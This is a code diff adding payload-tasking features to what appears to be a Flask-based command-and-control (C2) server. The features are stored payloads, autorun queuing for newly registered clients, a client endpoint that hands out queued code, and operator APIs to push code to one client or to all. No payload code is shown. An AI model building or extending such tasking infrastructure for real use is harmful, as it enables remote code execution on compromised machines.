@@ -399,7 +399,28 @@ class AppSettings(db.Model):
         return f'<AppSettings {self.id}>'
 
 
-   
+
+class CustomPayload(db.Model):
+    id          = db.Column(db.Integer, primary_key=True)
+    name        = db.Column(db.String(100), nullable=False)
+    description = db.Column(db.Text, nullable=True)
+    code        = db.Column(db.Text, nullable=False)
+    autorun     = db.Column(db.Boolean, nullable=False, default=False)
+
+    def __repr__(self):
+        return f'<CustomPayload {self.id}>'
+
+
+
+class ClientPayloadJob(db.Model):   
+    id          = db.Column(db.Integer, primary_key=True)
+    clientKey   = db.Column(db.Integer, nullable=False)
+    code        = db.Column(db.Text, nullable=False)
+
+    def __repr__(self):
+        return f'<ClientPayloadJob {self.id}>'
+
+
 
 # User C2 UI session
 class User(UserMixin, db.Model):
@@ -747,10 +768,38 @@ def returnUUID():
     
     threadLock.release()
 
+    # Add any autorun payloads for this client
+    payloads = CustomPayload.query.filter_by(autorun=True)
+    client   = Client.query.filter_by(uuid=token).first()
+
+    for payload in payloads:
+        newJob = ClientPayloadJob(clientKey=client.id, code=payload.code)
+        db.session.add(newJob)
+    dbCommit()
 
     uuidData = {'clientToken':token}
 
     return jsonify(uuidData)
+
+
+
+# Check for custom payload jobs for the client
+@app.route('/client/taskCheck/<identifier>', methods=['GET'])
+def returnPayloads(identifier):
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
+    client   = Client.query.filter_by(uuid=identifier).first()
+    payloads = ClientPayloadJob.query.filter_by(clientKey=client.id)
+
+    taskedPayloads = [{'id':payload.id, 'data':payload.code} for payload in payloads]
+
+    for payload in payloads:
+        db.session.delete(payload)
+        dbCommit()
+
+    return jsonify(taskedPayloads)
+
 
 
 
@@ -1538,8 +1587,6 @@ def setAllowNewClientSessions(setting):
 
 
 
-
-
 @app.route('/api/blockClientSession/<key>', methods=['GET'])
 @login_required
 def blockClientSession(key):
@@ -1549,6 +1596,140 @@ def blockClientSession(key):
 
     return "ok", 200
 
+
+
+@app.route('/api/getSavedPayloads', methods=['GET'])
+@login_required
+def getSavedCustomPayloads():
+    savedPayloads = CustomPayload.query.all()
+
+    allSavedPayloads = [{'id':escape(payload.id), 'name':escape(payload.name), 'autorun':payload.autorun} for payload in savedPayloads]
+
+    return jsonify(allSavedPayloads)
+
+
+
+
+@app.route('/api/getSavedPayloadCode/<key>', methods=['GET'])
+@login_required
+def getSavedPayloadCode(key):
+    payload = CustomPayload.query.filter_by(id=key).first()
+
+    payloadData = {'name':escape(payload.name), 'description':escape(payload.description),'code':escape(payload.code)}
+
+    return jsonify(payloadData)
+
+
+
+@app.route('/api/getAllPayloads', methods=['GET'])
+@login_required
+def getAllSavedPayloads():
+    payloads = CustomPayload.query.all()
+
+    allPayloadsDump = [{'name':payload.name, 'description':payload.description, 'code':payload.code} for payload in payloads]
+
+    return jsonify(allPayloadsDump)
+
+
+
+
+@app.route('/api/setPayloadAutorun', methods=['POST'])
+@login_required
+def setPayloadAutorun():
+    content = request.json
+    name    = content['name']
+    autorun = content['autorun']
+
+    payload = CustomPayload.query.filter_by(name=name).first()
+    
+    payload.autorun = autorun
+
+    dbCommit()
+
+    return "ok", 200
+
+
+@app.route('/api/runPayloadAllClients/<key>', methods=['GET'])
+@login_required
+def runPayloadAllClients(key):
+    payload = CustomPayload.query.filter_by(id=key).first()
+
+    clients = Client.query.all()
+
+    for client in clients:
+        if client.sessionValid:
+            newJob = ClientPayloadJob(clientKey=client.id, code=payload.code)
+            db.session.add(newJob)
+
+    dbCommit()
+
+    return "ok", 200
+
+
+
+
+
+@app.route('/api/runPayloadSingleClient', methods=['POST'])
+@login_required
+def runPayloadSingleClient():
+    content = request.json 
+
+    payloadKey = content['payloadKey']
+    clientKey  = content['clientKey']
+
+    payload = CustomPayload.query.filter_by(id=payloadKey).first()
+
+    # testing just for the print
+    client = Client.query.filter_by(id=clientKey).first()
+
+    print("Running single client payload:")
+    print("Client: " + client.nickname)
+    print("Code: " + payload.code)
+
+    newJob = ClientPayloadJob(clientKey=clientKey, code=payload.code)
+    db.session.add(newJob)
+    dbCommit()
+
+    return "ok", 200
+
+
+
+
+
+
+@app.route('/api/savePayload', methods=['POST'])
+@login_required
+def saveCustomPayload():
+    content        = request.json 
+
+    name           = content['name']
+    newDescription = content['description']
+    newCode        = content['code']
+
+    # Check if this is an existing payload we're just updating
+    payload = CustomPayload.query.filter_by(name=name).first()
+
+    if payload is not None:
+        payload.description = newDescription
+        payload.code        = newCode
+    else:
+        newPayload = CustomPayload(name=name, description=newDescription, code=newCode)
+        db.session.add(newPayload)
+
+    dbCommit()
+
+    return "ok", 200
+
+
+
+@app.route('/api/deletePayload/<key>', methods=['GET'])
+@login_required
+def deleteCustomPayload(key):
+    payload = CustomPayload.query.filter_by(id=key).first()
+    db.session.delete(payload)
+    dbCommit()
+
+    return "ok", 200
 
 #**************************************************************************
 
